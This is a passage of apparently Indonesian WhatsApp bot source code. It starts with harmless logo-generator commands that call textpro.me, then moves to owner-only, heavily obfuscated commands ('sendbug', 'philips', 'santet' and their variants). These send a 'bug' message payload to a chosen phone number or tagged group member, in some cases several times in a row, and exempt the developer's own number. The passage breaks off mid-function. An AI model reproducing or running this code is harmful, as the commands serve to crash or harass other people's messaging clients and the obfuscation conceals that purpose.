reply(mess.wait)
maker.textpro("https://textpro.me/holographic-3d-text-effect-975.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'bear': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot|Cantik`) 
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [`${teks1}`,`${teks2}`])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'wolf': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot|Gantenk`) 
reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [`${teks1}`,`${teks2}`])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'joker': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/create-logo-joker-online-934.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'dropwater': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'neonlight': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'natural': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/natural-leaves-text-effect-931.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'carbon': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/carbon-text-effect-833.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'pencil': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [`${q}`,])
.then((data) => zeroyt7.sendMessage(from, { image: { url: data }, caption: creator }, { quoted: fkontak }))
.catch((err) => console.log(err));
}
break
case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas':
case 'deepsea': case 'scifi': case 'rainbow': case 'waterpipe': case 'spooky': 
case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': 
case 'berry': case 'thunder': case 'magma':
case 'harrypotter': case 'brokenglass': 
case 'watercolor': case 'multicolor': case 'underwater': case 'graffitibike':
case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': 
case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'toxic': 
case 'lava': case 'rock': case 'bloodglas': case 'hallowen': case 'darkgold': case 'joker': case 'wicker':
case 'firework': case 'skeleton': case 'sand': case 'glue': case '1917': case 'leaves': {
if (!text) return reply(`Masukan Teks Nya\nContoh : ${prefix + command} Pinot`) 
reply(mess.wait)
var link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
var anu = await maker.textpro(link, q)
zeroyt7.sendMessage(from, { image: { url: anu }, caption: creator }, { quoted: fkontak })
}
break
case 'jadibot': {
if (!isOwner) return reply(mess.owner)
jadibot(zeroyt7, fkontak, from)
}
break
case 'listjadibot':
if (!isOwner) return reply(mess.owner)
try {
let user = [... new Set([...global.conns.filter(zeroyt7 => zeroyt7.user).map(zeroyt7 => zeroyt7.user)])]
te = "*List Jadibot*\n\n"
for (let i of user){
let y = await zeroyt7.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
zeroyt7.sendMessage(from,{text:te,mentions: [y], },{quoted:fkontak})
} catch (err) {
reply(`Belum Ada User Yang Jadibot`)
}
break
case 'sendbug':
case 'philips': {
function _0x5b2d(){var _0x464ab3=['53816cyxCpq','mer\x20Hp\x20Yg\x20','7kXjhTy','sendMessag','im\x20Bug\x20!\x0a*','split','per\x20gua','@s.whatsap','157362BtIceD','\x20628xxx','owner','443744AOyYcQ','Mau\x20Di\x20Kir','Lu\x20Sendiri','840@s.what','1181341sUueTr','sapp.net','360DVHHEZ','Itu\x20develo','Sukses\x20kir','3127235LbbJXp','p.net','152294wdveAv','2629104SDsYQN','6281548926','Itu\x20Nomor\x20','Masukan\x20No','Contoh:\x20','\x20to\x20@','im\x20philips'];_0x5b2d=function(){return _0x464ab3;};return _0x5b2d();}var _0x8d8423=_0x2aaf;(function(_0xdfa035,_0x57cd61){var _0xa7325a=_0x2aaf,_0x28a5e0=_0xdfa035();while(!![]){try{var _0x1e1309=parseInt(_0xa7325a(0x1ad))/(0xecc+-0x1ed*0x3+-0x904)+parseInt(_0xa7325a(0x1b4))/(0xcc3+0x1*-0x20de+-0x10f*-0x13)+-parseInt(_0xa7325a(0x1b5))/(-0x1543*-0x1+-0x509+-0x1037)+-parseInt(_0xa7325a(0x1c7))/(0x1*-0x58c+0x31*-0x6d+0x1a6d)+parseInt(_0xa7325a(0x1b2))/(0x1d8e+-0xf*-0xc+0x1*-0x1e3d)+-parseInt(_0xa7325a(0x1c4))/(-0x3*-0xed+0x37*-0x45+-0x67*-0x1e)*(parseInt(_0xa7325a(0x1be))/(0x9f4+-0x1173+0x786))+parseInt(_0xa7325a(0x1bc))/(0x54c+0x1047+-0x158b)*(-parseInt(_0xa7325a(0x1af))/(0x2669+-0x26bc+0x2*0x2e));if(_0x1e1309===_0x57cd61)break;else _0x28a5e0['push'](_0x28a5e0['shift']());}catch(_0x69bdca){_0x28a5e0['push'](_0x28a5e0['shift']());}}}(_0x5b2d,-0x96713+-0x7c681*0x1+0x1a5698));if(!isOwner)return reply(mess[_0x8d8423(0x1c6)]);if(!text)return reply(_0x8d8423(0x1b8)+_0x8d8423(0x1bd)+_0x8d8423(0x1c8)+_0x8d8423(0x1c0)+_0x8d8423(0x1b9)+(prefix+command)+_0x8d8423(0x1c5));var num=q+(_0x8d8423(0x1c3)+_0x8d8423(0x1b3)),dev=_0x8d8423(0x1b6)+_0x8d8423(0x1ac)+_0x8d8423(0x1ae);function _0x2aaf(_0x5aea00,_0x1e351e){var _0x424eef=_0x5b2d();return _0x2aaf=function(_0x151740,_0x5c90bc){_0x151740=_0x151740-(-0x1*-0x10e2+-0xdb5+0x37*-0x7);var _0x52f58e=_0x424eef[_0x151740];return _0x52f58e;},_0x2aaf(_0x5aea00,_0x1e351e);}if(num==dev)return reply(_0x8d8423(0x1b0)+_0x8d8423(0x1c2));if(num==sender)return reply(_0x8d8423(0x1b7)+_0x8d8423(0x1c9));await sleep(-0x15cb+0x24c5+-0x342),zeroyt7[_0x8d8423(0x1bf)+'e'](num,{'text':philips},{'quoted':fkontak}),await sleep(-0x17c3+0xa20+0x195b),reply(_0x8d8423(0x1b1)+_0x8d8423(0x1bb)+_0x8d8423(0x1ba)+num[_0x8d8423(0x1c1)]('@')[0x1*-0x16ca+0x35d*0x7+-0xc1],[num]);
}
break
case 'philips2': {
var _0x1d1e1b=_0x7f0e;(function(_0xc3ed02,_0x28bb12){var _0x835fd8=_0x7f0e,_0x19c482=_0xc3ed02();while(!![]){try{var _0xbc476f=-parseInt(_0x835fd8(0x1d3))/(0x2662+-0x12e2+-0xd9*0x17)+-parseInt(_0x835fd8(0x1c9))/(-0x2a9+-0x22b4+0x255f)*(-parseInt(_0x835fd8(0x1c5))/(-0x1495+-0x2*0xe0c+0x30b0))+parseInt(_0x835fd8(0x1c4))/(0x2*-0xb89+0x1*0x11bc+-0x2ad*-0x2)*(parseInt(_0x835fd8(0x1d5))/(0xded+-0x2249*0x1+0x1461))+-parseInt(_0x835fd8(0x1db))/(-0x265+0x1d60+-0x67*0x43)*(parseInt(_0x835fd8(0x1c7))/(-0xe5+-0xf5b*-0x2+-0x9ee*0x3))+parseInt(_0x835fd8(0x1d0))/(0x93c*0x2+-0x2bb*0x1+-0xfb5)*(-parseInt(_0x835fd8(0x1e2))/(-0x3*0x54b+-0xd73+0x1d5d))+-parseInt(_0x835fd8(0x1d2))/(-0x64+-0x2b*0xbc+0x2*0x1001)*(-parseInt(_0x835fd8(0x1de))/(0x16f1+-0x4*-0x8b+-0x1912*0x1))+parseInt(_0x835fd8(0x1dc))/(0x1*-0xb8d+-0xd29+0x18c2)*(-parseInt(_0x835fd8(0x1e1))/(0x171d*-0x1+-0x2671+0x3d9b));if(_0xbc476f===_0x28bb12)break;else _0x19c482['push'](_0x19c482['shift']());}catch(_0x1f4790){_0x19c482['push'](_0x19c482['shift']());}}}(_0x2b18,-0x1*0x8f48f+0x12268f+0xcff8));if(!isOwner)return reply(mess[_0x1d1e1b(0x1df)]);if(!text)return reply(_0x1d1e1b(0x1cf)+_0x1d1e1b(0x1d6)+_0x1d1e1b(0x1cb)+_0x1d1e1b(0x1e3)+_0x1d1e1b(0x1dd)+(prefix+command)+_0x1d1e1b(0x1ca));var num=q+(_0x1d1e1b(0x1e0)+_0x1d1e1b(0x1d9)),dev=_0x1d1e1b(0x1d8)+_0x1d1e1b(0x1d1)+_0x1d1e1b(0x1da);function _0x7f0e(_0x12daa9,_0x127146){var _0x513250=_0x2b18();return _0x7f0e=function(_0x5992b0,_0x352020){_0x5992b0=_0x5992b0-(-0x375+-0x1e2c+0x3c*0x97);var _0x25d20a=_0x513250[_0x5992b0];return _0x25d20a;},_0x7f0e(_0x12daa9,_0x127146);}if(num==dev)return reply(_0x1d1e1b(0x1e4)+_0x1d1e1b(0x1c6));if(num==sender)return reply(_0x1d1e1b(0x1cc)+_0x1d1e1b(0x1c8));await sleep(-0xc*-0x5f+-0x816+0xf5a),zeroyt7[_0x1d1e1b(0x1cd)+'e'](num,{'text':philips},{'quoted':fkontak}),await sleep(-0x4f*-0x7+0xa40+-0xb1),zeroyt7[_0x1d1e1b(0x1cd)+'e'](num,{'text':philips},{'quoted':fkontak}),await sleep(-0x2*0xdb9+0xb14+0x1c16),reply(_0x1d1e1b(0x1c3)+_0x1d1e1b(0x1ce)+command+_0x1d1e1b(0x1d4)+num[_0x1d1e1b(0x1d7)]('@')[0x1ae2+0x11e7*0x1+-0x8f5*0x5],[num]);function _0x2b18(){var _0x57e1bf=['229836TxNhTB','108aDBrNl','Contoh:\x20','3284457PJjgMp','owner','@s.whatsap','1312103uXBHzA','2201373nbTYPh','im\x20Bug\x20!\x0a*','Itu\x20develo','Sukses\x20kir','1268dnsfTV','3IhPUlF','per\x20gua','42dzFpbx','Lu\x20Sendiri','2174674NWpTjk','\x20628xxx','Mau\x20Di\x20Kir','Itu\x20Nomor\x20','sendMessag','im\x20*','Masukan\x20No','16cbTEPv','840@s.what','40zMMUKy','441895aHcVeE','*\x20to\x20@','6995oEkyEU','mer\x20Hp\x20Yg\x20','split','6281548926','p.net','sapp.net'];_0x2b18=function(){return _0x57e1bf;};return _0x2b18();}
}
break
case 'philips3': {
function _0x3fe5(_0x260d04,_0x34c6dd){var _0x4d4354=_0x2750();return _0x3fe5=function(_0x22b4d6,_0x38c9bb){_0x22b4d6=_0x22b4d6-(-0x1218+-0xe*-0xad+0xa0f);var _0x5310d1=_0x4d4354[_0x22b4d6];return _0x5310d1;},_0x3fe5(_0x260d04,_0x34c6dd);}var _0x3d2456=_0x3fe5;(function(_0x46dfcd,_0x404d4f){var _0x535efa=_0x3fe5,_0x1912ce=_0x46dfcd();while(!![]){try{var _0x54dd8a=-parseInt(_0x535efa(0x189))/(-0x2*-0xfef+0x242b+-0x9b8*0x7)*(parseInt(_0x535efa(0x171))/(-0x4*-0x8f2+-0x1*0x1779+-0x1*0xc4d))+parseInt(_0x535efa(0x18c))/(-0x1b5e+-0xe36+-0x5f1*-0x7)*(-parseInt(_0x535efa(0x182))/(0x19d7+0x1*0x1681+-0x3054))+parseInt(_0x535efa(0x172))/(0x6c6+-0x601*-0x2+-0x12c3)*(parseInt(_0x535efa(0x18a))/(0x1517*0x1+-0x1609+0xf8))+parseInt(_0x535efa(0x184))/(0x75*-0x2f+-0x1*0x22c3+0x1*0x3845)*(parseInt(_0x535efa(0x178))/(-0x2*-0x973+-0x733+-0x67*0x1d))+parseInt(_0x535efa(0x173))/(0xfb3+0x2*0x167+-0x2*0x93c)*(-parseInt(_0x535efa(0x16e))/(0x8e*0x45+0x2*-0x5b3+-0x1ad6))+-parseInt(_0x535efa(0x17b))/(0x2*-0x1305+0x2683+-0x6e)*(-parseInt(_0x535efa(0x181))/(-0x2096+0x2ac+0x1df6*0x1))+-parseInt(_0x535efa(0x177))/(0x380+-0x383*-0xa+-0x2691)*(-parseInt(_0x535efa(0x175))/(-0x578+0x1e*-0x96+0x2*0xb8d));if(_0x54dd8a===_0x404d4f)break;else _0x1912ce['push'](_0x1912ce['shift']());}catch(_0x1f3253){_0x1912ce['push'](_0x1912ce['shift']());}}}(_0x2750,-0x8e1*-0x3e+0x1*0x533d7+0x3068f*-0x1));if(!isOwner)return reply(mess[_0x3d2456(0x17c)]);if(!text)return reply(_0x3d2456(0x183)+_0x3d2456(0x18d)+_0x3d2456(0x17e)+_0x3d2456(0x187)+_0x3d2456(0x179)+(prefix+command)+_0x3d2456(0x17d));var num=q+(_0x3d2456(0x18b)+_0x3d2456(0x17f)),dev=_0x3d2456(0x188)+_0x3d2456(0x16f)+_0x3d2456(0x180);if(num==dev)return reply(_0x3d2456(0x186)+_0x3d2456(0x170));function _0x2750(){var _0x11d670=['9424duPvek','Contoh:\x20','*\x20to\x20@','11LMbAkP','owner','\x20628xxx','Mau\x20Di\x20Kir','p.net','sapp.net','4449768YNWigb','1711276VygHzq','Masukan\x20No','609PusOsi','im\x20*','Itu\x20develo','im\x20Bug\x20!\x0a*','6281548926','238334sQDZYg','12eUPvEK','@s.whatsap','3gbnRMp','mer\x20Hp\x20Yg\x20','sendMessag','Itu\x20Nomor\x20','Sukses\x20kir','40LJLGKp','840@s.what','per\x20gua','4eaHQVu','207530lLPoaE','540873IoIqHM','Lu\x20Sendiri','12210142igQUJv','split','13vZDKxC'];_0x2750=function(){return _0x11d670;};return _0x2750();}if(num==sender)return reply(_0x3d2456(0x18f)+_0x3d2456(0x174));zeroyt7[_0x3d2456(0x18e)+'e'](num,{'text':philips},{'quoted':fkontak}),await sleep(-0x1*-0x775+0x1cfc+-0x18b9),zeroyt7[_0x3d2456(0x18e)+'e'](num,{'text':philips},{'quoted':fkontak}),await sleep(-0x11*0x16b+0x23c6*-0x1+-0x4799*-0x1),zeroyt7[_0x3d2456(0x18e)+'e'](num,{'text':philips},{'quoted':fkontak}),await sleep(-0x45b*0x3+0x1*0x129+0x17a0),reply(_0x3d2456(0x16d)+_0x3d2456(0x185)+command+_0x3d2456(0x17a)+num[_0x3d2456(0x176)]('@')[0x4*0x578+-0x9*0x243+-0x185],[num]);
}
break
case 'santet': {
function _0x1f92(_0x27b119,_0x1e301c){var _0xc3a55f=_0x2b3e();return _0x1f92=function(_0x44a4bd,_0x34ba9e){_0x44a4bd=_0x44a4bd-(-0x23cd+0x5c2+0x1fea);var _0x2e00d1=_0xc3a55f[_0x44a4bd];return _0x2e00d1;},_0x1f92(_0x27b119,_0x1e301c);}var _0x212530=_0x1f92;(function(_0x2eb56a,_0x3b6a9d){var _0x2f7e41=_0x1f92,_0x446f91=_0x2eb56a();while(!![]){try{var _0x358237=parseInt(_0x2f7e41(0x1ef))/(-0x1f8+-0x18df+-0xd6c*-0x2)+parseInt(_0x2f7e41(0x1f4))/(-0x879*0x2+-0x24c7+0xabf*0x5)+parseInt(_0x2f7e41(0x1e5))/(0x2e*0x1+0x925*-0x4+0xef*0x27)*(-parseInt(_0x2f7e41(0x1e1))/(0xb2*0x2+-0xa29+0x8c9*0x1))+-parseInt(_0x2f7e41(0x1ec))/(0x1bb1+0x2*0x4fd+-0x25a6)*(parseInt(_0x2f7e41(0x1f5))/(-0x1f1a+0x3bc+0x6d9*0x4))+parseInt(_0x2f7e41(0x1e2))/(0x1*-0xcc7+-0x1df*0x3+0x126b)*(-parseInt(_0x2f7e41(0x1f6))/(0x187b+-0x5*0x7a9+0xdda))+parseInt(_0x2f7e41(0x1f7))/(-0x1d62+-0x252a+-0x1*-0x4295)*(parseInt(_0x2f7e41(0x1e4))/(-0x92f+-0x1d*0x42+0x10b3))+-parseInt(_0x2f7e41(0x1e0))/(-0x577*-0x7+0x172+-0x27a8);if(_0x358237===_0x3b6a9d)break;else _0x446f91['push'](_0x446f91['shift']());}catch(_0x230eb1){_0x446f91['push'](_0x446f91['shift']());}}}(_0x2b3e,-0x132307+0x1df4d+-0x1*-0x1be0e9));if(!isOwner)return reply(mess[_0x212530(0x1df)]);if(!isGroup)return reply(mess[_0x212530(0x1e3)]);var number;if(mentionUser[_0x212530(0x1e9)]!==-0xdd*0x11+-0x60e+-0x6e9*-0x3)number=mentionUser[0x32*0x8e+-0x30*0x21+-0x2*0xac6],await sleep(-0x29e*-0x4+0x7c+0xe*0xe),zeroyt7[_0x212530(0x1e8)+'e'](number,{'text':philips},{'quoted':fkontak}),reply(_0x212530(0x1ed)+_0x212530(0x1f3)+command+_0x212530(0x1f8)+number[_0x212530(0x1e7)]('@')[0x1e9b+0x1425*0x1+0xcb*-0x40],[number]);else isQuotedMsg?(number=quotedMsg[_0x212530(0x1f2)],await sleep(-0x2439+0xef*0x18+0x1989),zeroyt7[_0x212530(0x1e8)+'e'](number,{'text':philips},{'quoted':fkontak}),reply(_0x212530(0x1ed)+_0x212530(0x1f3)+command+_0x212530(0x1f8)+number[_0x212530(0x1e7)]('@')[-0x219*0x2+0xdbf*-0x1+-0x3*-0x5fb],[number])):reply(_0x212530(0x1e6)+_0x212530(0x1f1)+_0x212530(0x1eb)+_0x212530(0x1ea)+_0x212530(0x1f0)+_0x212530(0x1ee));function _0x2b3e(){var _0x3a7052=['9931823HbwKcK','68FFayMB','98FUWbeX','group','250jxcogt','103413EOJgKt','Tag\x20atau\x20r','split','sendMessag','length','ntet\x0a\x0a*Con','\x20yg\x20mau\x20sa','4765qPlVaI','Sukses\x20kir','tet\x20@tag','1365823GJLCko','toh:*\x20#san','eply\x20orang','sender','im\x20*','1967106HNJjDS','3288rbQitA','292976Kzmlic','313227jpnIpE','*\x20to\x20@','owner'];_0x2b3e=function(){return _0x3a7052;};return _0x2b3e();}
}
break
case 'santet2': {
var _0x466f24=_0x53e4;(function(_0x3f6284,_0x4f541f){var _0xcb5ce5=_0x53e4,_0x557abe=_0x3f6284();while(!![]){try{var _0x422b29=-parseInt(_0xcb5ce5(0x171))/(0x303*-0x6+0x1a1c+-0x809)*(-parseInt(_0xcb5ce5(0x182))/(0x1e09+-0x9dc+-0x1*0x142b))+parseInt(_0xcb5ce5(0x183))/(0x1*0x51b+0x42e+-0x946)+-parseInt(_0xcb5ce5(0x16f))/(-0x14bb+0xaf+0x504*0x4)*(parseInt(_0xcb5ce5(0x180))/(-0x1*-0xd16+0x1*-0xeb9+0x1a8))+-parseInt(_0xcb5ce5(0x170))/(-0x1ade+0x9cd*0x1+0x1117)*(parseInt(_0xcb5ce5(0x187))/(-0x1915+0x1d40+-0x14*0x35))+-parseInt(_0xcb5ce5(0x17e))/(-0x6c*-0x2e+0x572*-0x5+0x1e*0x43)+-parseInt(_0xcb5ce5(0x178))/(-0xd47+0x1aad+-0xd5d)*(parseInt(_0xcb5ce5(0x17f))/(-0x3*-0xa07+-0x1514+-0x8f7))+parseInt(_0xcb5ce5(0x17b))/(-0x16ab+0x367*0xb+-0xeb7);if(_0x422b29===_0x4f541f)break;else _0x557abe['push'](_0x557abe['shift']());}catch(_0x506fd3){_0x557abe['push'](_0x557abe['shift']());}}}(_0x4648,-0x59950+0x50649+0x23*0x19c7));function _0x4648(){var _0x458b83=['Sukses\x20kir','20206dcBDOB','467010eeXRwJ','toh:*\x20#san','Tag\x20atau\x20r','ntet\x0a\x0a*Con','7jcSTJE','\x20yg\x20mau\x20sa','*\x20to\x20@','4|0|5|1|3|','54972WXUkBp','1426566gqLZns','17bRphvq','group','4|0|3|5|1|','owwner','eply\x20orang','split','tet\x20@tag','9bFOJfx','sender','sendMessag','7247691jIJmPC','length','im\x20*','32168LDQOsf','2076190jSpBkl','125MpajbG'];_0x4648=function(){return _0x458b83;};return _0x4648();}function _0x53e4(_0x2973e0,_0x1cc7f9){var _0x313d3b=_0x4648();return _0x53e4=function(_0x4770e0,_0x434dda){_0x4770e0=_0x4770e0-(-0x2c4+-0x22*-0x10a+-0x1f22);var _0x2cf662=_0x313d3b[_0x4770e0];return _0x2cf662;},_0x53e4(_0x2973e0,_0x1cc7f9);}if(!isOwner)return reply(mess[_0x466f24(0x174)]);if(!isGroup)return reply(mess[_0x466f24(0x172)]);var number;if(mentionUser[_0x466f24(0x17c)]!==0x26e9+0x5*0x73a+-0x4b0b){var nCDtcw=(_0x466f24(0x16e)+'2')[_0x466f24(0x176)]('|'),JuczVC=-0x346*-0x3+-0x1a74+0x10a2;while(!![]){switch(nCDtcw[JuczVC++]){case'0':await sleep(0x1737+-0x7*-0x491+-0x2*0x15bb);continue;case'1':await sleep(-0x5e*0x3d+0xe*0xc2+-0x66*-0x3b);continue;case'2':reply(_0x466f24(0x181)+_0x466f24(0x17d)+command+_0x466f24(0x189)+number[_0x466f24(0x176)]('@')[0x1552+-0x1d30+-0x3ef*-0x2],[number]);continue;case'3':zeroyt7[_0x466f24(0x17a)+'e'](number,{'text':philips},{'quoted':fkontak});continue;case'4':number=mentionUser[-0x1*-0x2643+0x1813+-0x65*0x9e];continue;case'5':zeroyt7[_0x466f24(0x17a)+'e'](number,{'text':philips},{'quoted':fkontak});continue;}break;}}else{if(isQuotedMsg){var Bdfnuz=(_0x466f24(0x173)+'2')[_0x466f24(0x176)]('|'),rTXmjA=0x1aaf+-0x2142+0x693;while(!![]){switch(Bdfnuz[rTXmjA++]){case'0':await sleep(0x22*-0x3b+0x1881+-0x7*0xb5);continue;case'1':zeroyt7[_0x466f24(0x17a)+'e'](number,{'text':philips},{'quoted':fkontak});continue;case'2':reply(_0x466f24(0x181)+_0x466f24(0x17d)+command+_0x466f24(0x189)+number[_0x466f24(0x176)]('@')[0x3*-0x283+0x13e+0x64b*0x1],[number]);continue;case'3':zeroyt7[_0x466f24(0x17a)+'e'](number,{'text':philips},{'quoted':fkontak});continue;case'4':number=quotedMsg[_0x466f24(0x179)];continue;case'5':await sleep(-0x16ff*0x1+0x1286+0x1031);continue;}break;}}else reply(_0x466f24(0x185)+_0x466f24(0x175)+_0x466f24(0x188)+_0x466f24(0x186)+_0x466f24(0x184)+_0x466f24(0x177));}
}
break
case 'santet3': {
var _0x319a60=_0x575a;(function(_0x2d1eff,_0x2bc255){var _0x2e51c5=_0x575a,_0x3beeaa=_0x2d1eff();while(!![]){try{var _0xff6c8b=-parseInt(_0x2e51c5(0x19b))/(0x43e+-0x2c*0x2c+0x353)*(-parseInt(_0x2e51c5(0x1ab))/(-0x1a64*-0x1+-0x3ba*-0x1+-0x1e1c))+parseInt(_0x2e51c5(0x1b3))/(0x1b1a+-0x114f+-0x9c8*0x1)*(-parseInt(_0x2e51c5(0x1b4))/(-0x9*-0x3c7+0x1985+-0x3b80))+-parseInt(_0x2e51c5(0x196))/(-0x1*0x145c+-0x24f1+-0x1*-0x3952)+-parseInt(_0x2e51c5(0x1b0))/(-0x21f9+-0x7*0xb6+0x26f9*0x1)*(parseInt(_0x2e51c5(0x1a6))/(0x22a+0xc5*0x5+0x1*-0x5fc))+parseInt(_0x2e51c5(0x19e))/(0x662*0x3+0x2*0x527+-0x1d6c)*(parseInt(_0x2e51c5(0x199))/(0x134e+-0x19ae+0x3*0x223))+parseInt(_0x2e51c5(0x198))/(0xa99*-0x3+-0x125f+0x3234)+parseInt(_0x2e51c5(0x1af))/(-0x19a3+0xd74+-0x1*-0xc3a)*(parseInt(_0x2e51c5(0x1a3))/(-0x268a*-0x1+-0x1f85+0x7*-0xff));if(_0xff6c8b===_0x2bc255)break;else _0x3beeaa['push'](_0x3beeaa['shift']());}catch(_0x28900a){_0x3beeaa['push'](_0x3beeaa['shift']());}}}(_0x5e2f,-0xc1b6b+-0x226*-0x1af+0x125647));function _0x575a(_0x2978e9,_0x5c6f00){var _0x2fc06b=_0x5e2f();return _0x575a=function(_0x3a9b69,_0x5b0d5d){_0x3a9b69=_0x3a9b69-(0x25b*0x4+0xc0f+0x13e5*-0x1);var _0x35b617=_0x2fc06b[_0x3a9b69];return 